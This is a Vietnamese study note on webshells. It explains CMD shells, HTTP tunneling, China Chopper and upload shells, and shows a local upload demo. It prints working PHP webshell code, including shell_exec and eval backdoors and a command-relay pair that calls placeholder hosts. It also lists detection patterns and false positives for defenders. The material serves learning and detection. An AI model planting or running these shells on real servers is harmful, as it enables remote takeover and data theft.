# Webshell

## I. Lý thuyết

- Webshell là một loại phần mềm độc hại được sử dụng để kiểm soát từ xa các máy chủ web thông qua giao diện dòng lệnh. Được viết bằng nhiều ngôn ngữ lập trình như PHP, ASP, JSP, Perl, Python, và Ruby, webshell cho phép kẻ tấn công thực hiện các hoạt động không được ủy quyền trên máy chủ web, như thêm, xóa hoặc sửa đổi tệp, thực thi mã độc hại, thu thập thông tin nhạy cảm, và thậm chí kiểm soát toàn bộ hệ thống.

- Khi một kẻ tấn công đã cài đặt webshell trên máy chủ, họ có thể truy cập vào nó từ xa thông qua Internet, thường bằng cách sử dụng trình duyệt web hoặc các công cụ quản lý tệp. Điều này cho phép họ thực hiện các hành động tấn công mà không cần truy cập trực tiếp vào máy chủ mục tiêu, làm tăng nguy cơ lạm dụng và xâm nhập vào hệ thống.

- Do tính linh hoạt và khả năng ẩn mình cao, việc phát hiện và loại bỏ webshell có thể trở thành một nhiệm vụ khó khăn cho các nhà quản trị hệ thống và bảo mật mạng.

![webshell.png](./images/webshell.png)

### 1. CMD Shell

- `CMD shell (Webshell)` là một loại webshell được thiết kế để thực thi các lệnh dòng lệnh trên máy chủ thông qua giao diện dòng lệnh của hệ điều hành (thực thi các lệnh bên trong hệ thống bằng cách sử dụng hàm `shell_exec`). Điều này cho phép kẻ tấn công thực hiện các hành động quản trị hệ thống trực tiếp từ xa thông qua một giao diện web.

- Một `CMD shell` thường cung cấp các chức năng như thực thi lệnh, xem và chỉnh sửa tệp, thực hiện các tác vụ hệ thống, quản lý quyền truy cập và thậm chí kiểm soát toàn bộ hệ thống nếu kẻ tấn công có đủ quyền truy cập.

- `CMD shell` thường được viết bằng các ngôn ngữ như PHP, ASP, hoặc các ngôn ngữ khác được hỗ trợ trên nền tảng web, và chúng thường được sử dụng như một phần của các cuộc tấn công mạng hoặc xâm nhập vào hệ thống. Việc phát hiện và loại bỏ CMD shell là một phần quan trọng của việc bảo vệ hệ thống thông tin và mạng.

```php
<?php
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}
?>
```

### 2. HTTP Tunnel

- `HTTP Tunneling` là một kỹ thuật được sử dụng để truy cập và truyền dữ liệu qua các tường lửa hoặc bộ lọc mạng bằng cách sử dụng giao thức HTTP. Trong ngữ cảnh của web shell, HTTP Tunneling được sử dụng để tạo ra một kênh truy cập từ xa vào máy chủ thông qua giao diện web, giúp kẻ tấn công thực hiện các hoạt động độc hại mà không cần phải trực tiếp truy cập vào máy chủ.

- Web shell dựa trên `HTTP Tunneling` thường được cài đặt trên máy chủ web mục tiêu thông qua các lỗ hổng bảo mật, sau đó tạo ra một kết nối mã hóa thông qua giao thức HTTP để gửi và nhận dữ liệu giữa máy chủ và máy tính của kẻ tấn công. Điều này cho phép kẻ tấn công thực thi các lệnh dòng lệnh, truy cập vào tệp, thực hiện các hoạt động khác trên máy chủ từ xa một cách không phát hiện được.

- `HTTP Tunneling` thường được sử dụng để bypass các cơ chế kiểm soát mạng như tường lửa và bộ lọc, vì nó giống như việc truy cập các trang web thông thường. Do đó, việc phát hiện và ngăn chặn các web shell dựa trên HTTP Tunneling là một phần quan trọng của các biện pháp bảo mật mạng.

- `Client.php`:

```php
<?php
// Dữ liệu cần gửi thông qua tunnel
$data = 'command=ls -la';

// Gửi yêu cầu HTTP đến máy chủ webshell
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://webshell-server.com/shell.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'data' => $data
]));
$response = curl_exec($ch);
curl_close($ch);

// Xử lý và hiển thị phản hồi từ máy chủ webshell
echo $response;
?>
```

- `Server.php`:

```php
<?php
// Thông tin máy chủ kiểm soát
$controlServer = 'http://control-server.com/tunnel';
$apiKey = 'your-api.key';

// Lấy dữ liệu từ yêu cầu POST
$data = $_POST['data'];

// Gửi yêu cầu đến máy chủ kiểm soát
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $controlServer);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'data' => $data
]));
$response = curl_exec($ch);
curl_close($ch);

// Xử lý và hiển thị phản hồi từ máy chủ control
echo $response;
?>
```

### 3. Chooper

- `Chooper` cho phép tấn công, thực hiện các hoạt động độc hại và kiểm soát từ xa các hệ thống mà đã được xâm nhập. Chooper có kích thước nhỏ nên khó phát hiện.

```php
<?php @eval($_POST['password']);?>
```

- Như code trên thì sử dụng hàm `eval()` để thực thi một đoạn mã PHP được truyền vào thông qua biến POST có tên `'password'`. Điều này có nghĩa là bất kỳ mã PHP nào được gửi thông qua phương thức POST với tham số `'password'` sẽ được thực thi.

### 4. Upload shell

- `Upload shell` là một thuật ngữ trong lĩnh vực bảo mật mạng và hacking, thường được sử dụng để mô tả hành động của việc tải lên một web shell (còn được gọi là backdoor) lên một máy chủ web mục tiêu. Quá trình này thường được thực hiện bằng cách tận dụng các lỗ hổng bảo mật trong các ứng dụng web hoặc phần mềm máy chủ, thông qua việc sử dụng các kỹ thuật như file inclusion, file upload vulnerabilities, hoặc các lỗ hổng trong quản lý phiên.

- `Upload Shell` là một shell giúp cho người dùng tiện dụng hơn trong việc upload các file lên web. Khi web không đảm bảo file upload lên được kiểm soát chặt chẽ, hacker rất có thể sẽ sử dụng các shell giả mạo dưới dạng file ảnh (upload avatar) nhằm thực thi mã và chiếm quyền điều khiển. Từ đó tạo một lỗ hổng upload giúp ta có thể upload các file khác định dạng bắt buộc của web không bị giới hạn bởi kích thước.

```php
<?php
if($_SERVER['REQUEST_METHOD'] === 'POST'){
    $targetDir = 'upload'; // Thư mục đích để lưu tệp tin tải lên
    $targetFile = $targetDir . basename($_FILES['userfile']['name']);

    if(move_uploaded_file($_FILES['userfile']['tmp_name'], $targetFile)){
        // Nhảy tới đường dẫn của tệp tin đã tải lên trong thư mục "upload"
        header("Location: $targetFile");
        exit;
    }
}
?>
<form enctype="multipart/form-data" action="" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="100000">
    Send this file: <input name="userfile" type="file">
    <input type="submit" value="Send">
</form>
```

- Ví dụ như thông qua việc upload avatar thì ta đẩy lên file shell upload giả mạo ảnh. Từ đấy tạo 1 giao diện thuận lợi cho việc upload. Qua đó upload lên các shell độc hại khác và tiến hành khai thác thông tin, chiếm quyền điều khiển,...

## II. Pattern dấu hiệu

- Xây dựng tài liệu ghi lại các pattern dấu hiệu đặc trưng để nhận diện webshell.

### 1. Trường hợp file PHP

- `eval()`: webshell eval thực thi lệnh do hacker truyền vào qua các biến trong request. Ví dụ `<?php eval($_GET('a')); ?>`.

  - Các trường hợp pattern trong ticket sẽ nghi ngờ cao là webshell:

    - `eval($_GET('string')); eval($_POST('string')); eval($_REQUEST('string'))`.
    - `eval($string)` -> Trường hợp này có thể biến `$string` đã được gán giá trị từ trước đó (Ví dụ `$string = $_GET('a'); eval($string)`). Trường hợp này cần mở file có pattern để kiểm tra xem giá trị $string được gán như thế nào. Nếu không xác minh được rõ ràng có thể chuyển về team web-security.
    - `eval(encode string)` -> Trường hợp này có thể hacker đã thực hiện encode nội dung bên trong hàm eval. Cần thực hiện mở file có pattern sau đó thực hiện decode chuỗi `$string` để xem luồng truyền dữ liệu vào hàm eval. Nếu không xác minh được rõ ràng có thể chuyển về team web-security.

  - Các trường hợp FP hay gặp:
    - `eval('response = '+response+';')`.
    - `eval('$string = '.$string. ';')`.
    - `Eval($filter)` (bắt từ chuỗi simpleEval($filter)).
    - `'Eval(&$item, &$dataType)', 'Eval($item[$key], $dataType)', 'Eval($value)','Eval($filters, $dataType)'`.

- `$recursive0($params, $level+1)', '$recursive0($params)'`.
- `exec ('sassc -t compressed -I '.$cwd.$bootstrapPath.' -I '.$cwd.portal()`.
- `System()`: Thực thi lệnh do hacker truyền vào qua các biến trong request. Check tương tự như trường hợp `eval()`:

  - Các trường hợp FP hay gặp:
    - `system('/u01/colombo/usr/bin/php -c /u01/colombo/etc/php.ini /u01/colombo/www/crontab/runService.php 59721 Education.CourseResult.Exam.autoMarkExamAll')`; tương ứng với file `Service__Education_Examination_Account-vi.php`.
    - `system("perl ./api/syslog-send.pl \"Syslog filter for ".$fil["mf_log"]." updated by".read_session('SesAccount')."\"");`.

- `string`: Thực thi lệnh bên trong dấu backtick (ví dụ `$a = 'whoami'; echo $a;`)
- `curl_exec($ch)`: Thực thi 1 request tương tự requests của python. Trường hợp này cần mở file sau đó search pattern curl_exec và kiểm tra trường url và postfield xem có bất thường không.

  - Ví dụ trường hợp FP:
    ![webshell_curlExec.png](./images/webshell_curlExec.png)

- `exec("ifconfig | grep -Eo 'inet (addr:)'`: tương ứng với các file common_utils.php, common_utils_Onme.php, common_utils_ViettelTV.php thì là FP. Đoạn code này fix cứng do nghiệp vụ lấy IP của server.
- `$class(sfContext::getInstance()`.
- `$class($this)`.

```php
$class($this)', "$class($this->dispatcher, $cache,
array_merge(array('auto_shutdown' => false, 'context' => $this-
>factories['request']->getRequestContext()", "$class($this->dispatcher,
array_merge(array('auto_shutdown' => false) ", '$class($this->dispatcher, array()',
"$class($this->dispatcher, $this->factories['storage'],
array_merge(array('auto_shutdown' => false, 'culture' => $this-
>factories['request']->getParameter('sf_culture') ", "$class($this->dispatcher,
sfConfig::get('sf_factory_response_parameters', array_merge(array('http_protocol'
=> isset($_SERVER['SERVER_PROTOCOL'])
```

- Dangerous PHP functions such as `exec(), shell_exec(), passthru(), system(), show_source(), proc_open(), pcntl_exec(), eval()`, and `assert()`.

### 2. Trường hợp file aspx, asp, cs

- `eval()` Thực thi lệnh truyền vào từ request. Dữ liệu được lấy từ request bằng cách `Request.Item['a']`
- Các trường hợp FP:
  - Eval("DATE_DEBIT")
  - Eval(Container.DataItem, "CategoryName")
  - Eval("CreatTime", "{0:dd/MM/yyyy (HH:mm:ss),
  - Eval("AMT_PAY","{0:#,##0}")

## III. Thực hiện Demo

- Thực hiện upload file `webshell.php` qua chức năng `Add Assignment` của account `teaacher`.

- `http://localhost/classmanagement/uploads/teacher/webshell.php?cmd=ipconfig`.

![demo.png](./images/demo.png)

## IV. Tham khảo:

- https://cloud.z.com/vn/news/web-shell/

- Webshell-pattern tham khảo:

  - https://www.acunetix.com/blog/articles/introduction-web-shells-part-1/

  - https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/

  - https://www.mandiant.com/resources/blog/breaking-down-china-chopper-web-shell-part-i
